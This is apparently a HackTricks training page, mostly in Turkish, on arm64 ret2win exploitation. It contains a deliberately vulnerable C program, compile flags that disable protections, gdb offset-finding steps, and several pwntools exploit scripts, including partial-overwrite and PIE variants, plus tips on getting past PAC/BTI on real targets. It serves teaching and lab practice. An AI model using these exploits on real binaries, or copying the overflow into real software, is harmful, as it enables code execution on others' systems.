# Ret2win - arm64

{{#include ../../../banners/hacktricks-training.md}}

arm64 hakkında bir giriş için:

{{#ref}}
../../../macos-hardening/macos-security-and-privilege-escalation/macos-apps-inspecting-debugging-and-fuzzing/arm64-basic-assembly.md
{{#endref}}

## Kod
```c
#include <stdio.h>
#include <unistd.h>

void win() {
printf("Congratulations!\n");
}

void vulnerable_function() {
char buffer[64];
read(STDIN_FILENO, buffer, 256); // <-- bof vulnerability
}

int main() {
vulnerable_function();
return 0;
}
```
pie ve canary olmadan derleyin:
```bash
clang -o ret2win ret2win.c -fno-stack-protector -Wno-format-security -no-pie -mbranch-protection=none
```
- Ek `-mbranch-protection=none` bayrağı AArch64 Branch Protection (PAC/BTI) özelliğini devre dışı bırakır. Eğer toolchain'iniz varsayılan olarak PAC veya BTI'yi etkinleştiriyorsa, bu labın yeniden üretilebilir kalmasını sağlar. Derlenmiş bir ikili dosyanın PAC/BTI kullanıp kullanmadığını kontrol etmek için:
- AArch64 GNU özelliklerine bakın:
- `readelf --notes -W ret2win | grep -E 'AARCH64_FEATURE_1_(BTI|PAC)'`
- Prolog/epiloglarda `paciasp`/`autiasp` (PAC) veya `bti c` landing pad'leri (BTI) için inceleyin:
- `objdump -d ret2win | head -n 40`

### AArch64 calling convention quick facts

- Link register `x30`'dur (a.k.a. `lr`), ve fonksiyonlar tipik olarak `x29`/`x30`'ı `stp x29, x30, [sp, #-16]!` ile kaydeder ve `ldp x29, x30, [sp], #16; ret` ile geri yükler.
- Bu, kaydedilmiş dönüş adresinin frame tabanına göre `sp+8`'de olduğu anlamına gelir. Altına yerleştirilmiş bir `char buffer[64]` ile, kaydedilmiş `x30`'a olan tipik overwrite mesafesi 64 (buffer) + 8 (kaydedilmiş x29) = 72 byte — aşağıda tam olarak bulacağımız sayı.
- Stack pointer fonksiyon sınırlarında 16‑byte hizasında kalmalıdır. Daha karmaşık senaryolar için daha sonra ROP zincirleri oluşturursanız, SP hizalamasını koruyun yoksa fonksiyon epiloglarında crash yaşayabilirsiniz.

## Finding the offset

### Pattern option

Bu örnek [**GEF**](https://github.com/bata24/gef) kullanılarak oluşturuldu:

Start gdb with gef, create pattern and use it:
```bash
gdb -q ./ret2win
pattern create 200
run
```
<figure><img src="../../../images/image (1205).png" alt=""><figcaption></figcaption></figure>

arm64, bozulmuş olan x30 kaydındaki adrese geri dönecektir; bunu pattern offset'i bulmak için kullanabiliriz:
```bash
pattern search $x30
```
<figure><img src="../../../images/image (1206).png" alt=""><figcaption></figcaption></figure>

**Offset 72'dir (9x48).**

### Stack offset seçeneği

pc register'ın saklandığı stack adresini alın:
```bash
gdb -q ./ret2win
b *vulnerable_function + 0xc
run
info frame
```
<figure><img src="../../../images/image (1207).png" alt=""><figcaption></figcaption></figure>

Şimdi `read()`'den sonra bir breakpoint ayarla ve `read()` yürütülene kadar continue et, ardından 13371337 gibi bir pattern ayarla:
```
b *vulnerable_function+28
c
```
<figure><img src="../../../images/image (1208).png" alt=""><figcaption></figcaption></figure>

Bu desenin bellekte nerede saklandığını bulun:

<figure><img src="../../../images/image (1209).png" alt=""><figcaption></figcaption></figure>

Sonra: **`0xfffffffff148 - 0xfffffffff100 = 0x48 = 72`**

<figure><img src="../../../images/image (1210).png" alt="" width="339"><figcaption></figcaption></figure>

## No PIE

### Normal

**`win`** fonksiyonunun adresini alın:
```bash
objdump -d ret2win | grep win
ret2win:     file format elf64-littleaarch64
00000000004006c4 <win>:
```
Exploit:
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)
# Optional but nice for AArch64
context.arch = 'aarch64'

# Prepare the payload
offset = 72
ret2win_addr = p64(0x00000000004006c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1211).png" alt="" width="375"><figcaption></figcaption></figure>

### Off-by-1

Aslında bu, stack'te saklanan PC'deki bir off-by-2'ye daha çok benziyor. Tüm return address'in tamamını üzerine yazmak yerine **sadece son 2 bayt**'ını `0x06c4` ile üzerine yazacağız.
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x06c4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
<figure><img src="../../../images/image (1212).png" alt="" width="375"><figcaption></figcaption></figure>

You can find another off-by-one example in ARM64 in [https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/](https://8ksec.io/arm64-reversing-and-exploitation-part-9-exploiting-an-off-by-one-overflow-vulnerability/), which is a real off-by-**one** in a fictitious vulnerability.

## PIE ile

> [!TIP]
> Binary'i **`-no-pie` argümanı olmadan** derleyin

### Off-by-2

Bir leak olmadan win function'ın tam adresini bilmiyoruz ama function'ın binary içindeki offset'ini bilebiliriz ve üzerine yazdığımız return address'in zaten yakın bir adrese işaret ettiğini bildiğimiz için, bu durumda win function için offset'i (**0x7d4**) leak etmek ve sadece o offset'i kullanmak mümkün:

<figure><img src="../../../images/image (1213).png" alt="" width="563"><figcaption></figcaption></figure>
```python
from pwn import *

# Configuration
binary_name = './ret2win'
p = process(binary_name)

# Prepare the payload
offset = 72
ret2win_addr = p16(0x07d4)
payload = b'A' * offset + ret2win_addr

# Send the payload
p.send(payload)

# Check response
print(p.recvline())
p.close()
```
### Modern AArch64 sertleştirmesi (PAC/BTI) ve ret2win hakkında notlar

- Binary AArch64 Branch Protection ile derlenmişse, fonksiyon prolog/epiloglarında `paciasp`/`autiasp` veya `bti c` görünebilir. Bu durumda:
- Geçerli bir BTI landing pad'i olmayan bir adrese dönmek `SIGILL` oluşturabilir. `bti c` içeren kesin fonksiyon girişini hedeflemeyi tercih edin.
- Eğer PAC dönüşler için etkinse, naif dönüş adresi üzerine yazma denemeleri başarısız olabilir çünkü epilog `x30`'u doğrular. Öğrenme senaryoları için, yeniden derleyin: `-mbranch-protection=none` (yukarıda gösterildi). Gerçek hedeflere saldırırken, non‑return hijacks tercih edin (e.g., function pointer overwrites) veya sahte LR'inizi doğrulayan bir `autiasp`/`ret` çiftini asla çalıştırmayan bir ROP inşa edin.
- Özellikleri hızlıca kontrol etmek için:
- `readelf --notes -W ./ret2win` and look for `AARCH64_FEATURE_1_BTI` / `AARCH64_FEATURE_1_PAC` notes.
- `objdump -d ./ret2win | head -n 40` and look for `bti c`, `paciasp`, `autiasp`.

### non‑ARM64 ana makinelerde çalıştırma (qemu‑user hızlı ipucu)

If you are on x86_64 but want to practice AArch64:
```bash
# Install qemu-user and AArch64 libs (Debian/Ubuntu)
sudo apt-get install qemu-user qemu-user-static libc6-arm64-cross

# Run the binary with the AArch64 loader environment
qemu-aarch64 -L /usr/aarch64-linux-gnu ./ret2win

# Debug with GDB (qemu-user gdbstub)
qemu-aarch64 -g 1234 -L /usr/aarch64-linux-gnu ./ret2win &
# In another terminal
gdb-multiarch ./ret2win -ex 'target remote :1234'
```
### İlgili HackTricks sayfaları

-
{{#ref}}
../../rop-return-oriented-programing/rop-syscall-execv/ret2syscall-arm64.md
{{#endref}}
-
{{#ref}}
../../rop-return-oriented-programing/ret2lib/ret2lib-+-printf-leak-arm64.md
{{#endref}}



## Kaynaklar

- Enabling PAC and BTI on AArch64 for Linux (Arm Community, Nov 2024). https://community.arm.com/arm-community-blogs/b/operating-systems-blog/posts/enabling-pac-and-bti-on-aarch64-for-linux
- Procedure Call Standard for the Arm 64-bit Architecture (AAPCS64). https://github.com/ARM-software/abi-aa/blob/main/aapcs64/aapcs64.rst
{{#include ../../../banners/hacktricks-training.md}}
